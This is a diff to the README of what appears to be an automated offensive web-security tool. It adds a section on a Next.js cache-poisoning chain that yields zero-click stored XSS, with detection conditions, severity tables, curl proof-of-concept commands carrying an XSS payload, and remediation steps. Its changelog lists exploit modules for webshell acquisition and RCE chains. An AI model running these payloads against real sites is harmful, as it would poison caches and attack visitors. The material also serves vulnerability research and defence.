@@ -440,6 +440,86 @@ INFERRED  = /mics/login.jsp exists, endpoint not yet tested
 
 ---
 
+### Next.js Cache Poisoning → 0-click SXSS (v2.1)
+
+> **Research basis:**  
+> [Rachid Allam (zhero;) & inzo\_ — "Re:CACHE - Excessive reflection, type confusion, and 0-click SXSS on Next.js"](https://zhero-web-sec.github.io/research-and-things/re-cache-excessive-reflection-type-confusion-and-0-click-sxss-on-nextjs)  
+> Rewarded: **five-figure bug bounty** at a globally recognized company
+
+**Attack chain:**
+
+```
+① Request headers reflected in response headers (middleware misconfiguration)
+    Request:  Content-Type: text/html
+    Response: Content-Type: text/html  ← reflected as-is
+    
+② Next.js App Router + RSC payload context switch
+    GET /dynamic-page?pwn=<xss>  +  Rsc: 1  +  Content-Type: text/html
+    → RSC payload served as text/html instead of text/x-component
+    → URL params reflected in RSC body after __PAGE__ marker → XSS context
+    
+③ Cloudflare caches poisoned response (ignores Vary: Rsc)
+
+④ Stage 2: Home page poisoned with Refresh header
+    GET /  +  Refresh: 0; /dynamic-page?pwn=<xss>
+    → Victim visits homepage → auto-redirected → XSS fires
+    
+⑤ Zero-click: no user interaction required
+```
+
+**AI auto-trigger conditions** (bingo runs this automatically):
+
+| Condition | Detection method |
+|-----------|-----------------|
+| `x-powered-by: Next.js` | HTTP response header |
+| `_next/static` or `__NEXT_DATA__` in body | HTML body scan |
+| `cf-cache-status` header present | Cloudflare detection |
+| RSC response changes with `Rsc: 1` header | Active probe |
+
+**Finding types and evidence levels:**
+
+| Finding | Evidence Level | Severity |
+|---------|---------------|----------|
+| `nextjs_detected` | `VERIFIED` | Info |
+| `cache_layer` | `VERIFIED` (cf-cache-status header) | Medium |
+| `header_reflection` | `VERIFIED` (Content-Type changes) | High |
+| `rsc_dynamic_page` | `VERIFIED` (HTTP 200 + x-component) | Medium |
+| `content_type_injection` | `VERIFIED` (response CT = text/html) | High |
+| `param_reflected_in_rsc` | `VERIFIED` (marker in body) | Critical |
+| `cache_sxss_chain` | `VERIFIED`/`LIKELY` | Critical |
+
+**Auto-generated PoC:**
+
+```bash
+# Stage 1: Poison dynamic page
+curl -sk 'https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
+  -H 'Rsc: 1' \
+  -H 'Content-Type: text/html' -D -
+
+# Stage 2: Poison homepage with Refresh redirect
+curl -sk 'https://target.com/' \
+  -H 'Refresh: 0; https://target.com/about?pwn=<img src=x onerror=alert(1)>' \
+  -D -
+
+# Result: victim visits https://target.com/ → XSS fires automatically
+```
+
+**Vulnerable conditions (all must be true for full chain):**
+
+1. Next.js App Router (not Pages Router)
+2. Middleware forwards request headers to response headers
+3. External cache layer (Cloudflare, CDN) that ignores `Vary: Rsc`
+4. Dynamic pages with URL parameter → RSC body reflection
+
+**Remediation (auto-included in report):**
+1. **Remove header forwarding** in middleware — never pass request `Content-Type` to response
+2. Force `Content-Type: text/x-component` for all RSC responses (non-overridable)
+3. Exclude RSC paths from CDN caching (`Cache-Control: no-store`)
+4. HTML-encode all URL parameters before including in RSC payload
+5. Upgrade to Next.js 14.2.32+ / 15.4.7+
+
+---
+
 ### CSWSH + EXE Exposure + Localhost WebSocket RCE Chain (v2.1)
 
 > **Research basis:**  
@@ -782,7 +862,7 @@ bingo/
 - **IDOR Phase** — real-world IDOR enumeration, PII detection, and IDOR-based password reset with login verification
 - **Full i18n** — all UI strings (skill module names, commands, evidence labels) in Korean / Chinese / English
 - **9-phase pipeline** — extended from 5 to 9 phases (webshell acquisition, IDOR, login verification added)
-- **46 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46)
+- **47 skill modules** — added ClientSideAuthBypass (#40), ApiDiscoveryFuzzing (#41), MSSQL2025AIExploit (#42), ArubaOsXxeSsrf (#43), IvantiSentryRCE (#44), OAuthChainAttack (#45), CswshRceChain (#46), NextJsCacheSxss (#47)
 - Production-stable (`Development Status :: 5 - Production/Stable`)
 
 ### v2.0.x — Beta
